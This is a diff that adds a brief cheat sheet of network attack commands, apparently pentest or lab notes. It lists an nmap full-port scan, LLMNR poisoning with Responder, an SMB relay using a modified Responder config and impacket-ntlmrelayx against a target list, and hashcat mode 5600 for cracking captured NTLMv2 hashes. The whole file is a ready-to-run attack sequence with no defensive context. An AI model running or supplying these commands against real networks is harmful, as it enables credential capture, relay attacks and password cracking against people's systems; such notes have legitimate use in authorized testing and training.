@@ -1,0 +1,17 @@
+nmap -T4 -p- -A xxx.xxx.xxx.xxx/xx
+
+LLMNR Poisoning Attack
+
+responder -I *interface* -dwpv
+
+SMB Relay Attack
+
+nano /etc/responder/Responder.conf - disable SMB and HTTP
+
+sudo responder -I *interface* -dwpv
+
+sudo impacket-ntlmrelayx -tf targetslist.txt -smbsupport 
+
+Cracking NTLMv2 Hashes
+
+hashcat -m 5600 hash.txt /usr/share/wordlists - cracking NTLMv2
